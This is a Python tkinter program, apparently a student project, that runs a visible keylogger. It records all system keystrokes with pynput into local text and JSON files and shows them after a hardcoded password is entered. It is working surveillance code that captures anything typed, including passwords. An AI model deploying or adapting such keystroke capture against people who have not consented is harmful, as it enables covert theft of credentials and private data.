import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
from tkinter.ttk import *
from PIL import Image,ImageTk
import time 
from tkinter import messagebox
from functools import partial
import os
root=Tk()
root.geometry("500x500+100+100")
root.title("KEYLOGGER")
icon_image = Image.open("C:\\Users\\jashk\\OneDrive\\Desktop\\PBL project\\pic\\icon.ico")
icon = ImageTk.PhotoImage(icon_image)
root.iconphoto(True, icon)
bg=Image.open("C:\\Users\\jashk\\OneDrive\\Desktop\\PBL project\\pic\\keylogger.jpg")
bg=bg.resize((500,500))
bg=ImageTk.PhotoImage(bg)
canvas1=Canvas(height=600,width=600)
canvas1.create_image(0,0,anchor=NW,image=bg)
canvas1.pack()
bar=Progressbar(canvas1,orient=HORIZONTAL,length=200)
bar.place(x=200,y=300)
bar['value']=0
while bar['value']<100:
   bar['value']+=1
   root.update()
   time.sleep(0.005)
root.destroy()
shift=11
c=1

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    with open("C:\\Users\\jashk\\OneDrive\\Desktop\\PBL project\\key_log.txt","w+") as keys:
        keys.write(key)

def generate_json_file(keys_used):
    with open("C:\\Users\\jashk\\OneDrive\\Desktop\\PBL project\\key_log.json", '+wb') as key_log:
        key_list_bytes = json.dumps(keys_used).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global flag, keys_used, keys
    if flag == False:
        keys_used.append(
            {'Pressed':f'{key}'}
        )
        flag = True
    
    if flag == True:
        keys_used.append(
            {'Held':f'{key}'}
        )
    generate_json_file(keys_used)


def on_release(key):
    global flag, keys_used, keys
    keys_used.append(
        {'Released':f'{key}'}
    )

    if flag == True:
        flag = False
    generate_json_file(keys_used)

    keys = keys+str(key)
    generate_text_log(str(keys))

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

def view_log():
    password = password_entry.get()
    
    # Replace 'your_password' with your actual password
    if password == "jash":
        new_window = Toplevel(root)
        new_window.title("Keylog Viewer")
        text = Text(new_window)
        text.pack()
        
        # Read the content of the text file and display it in the new window
        with open("C:\\Users\\jashk\\OneDrive\\Desktop\\PBL project\\key_log.txt", "r") as file:
            content = file.read()
            text.insert(INSERT, content)

        password_entry.delete(0, "end")
    else:
        label.config(text="Incorrect password!")





root = Tk()
root.configure(bg="azure2")
root.title("Keylogger")

label = Label(root, text='Click "Start" to begin keylogging.',font=('Arial Bold',18))
label.config(anchor=CENTER)
label.pack()

start_button = Button(root, text="START", command=start_keylogger,padding=20)
start_button.place(x=50, y=300)  # Adjust x and y coordinates as needed

stop_button = Button(root, text="STOP", command=stop_keylogger, state='disabled',padding=20)
stop_button.place(x=440, y=300)  


password_label = Label(root, text="Password:",font=('Arial Bold',22))
password_label.place(x=50, y=400)
password_label.pack()
password_entry = Entry(root, show="*")  
password_entry.place(x=50, y=420)# Password is hidden
password_entry.pack()

view_button = Button(root, text="View Log",command=view_log)

view_button.pack()






root.geometry("600x500") 

root.mainloop()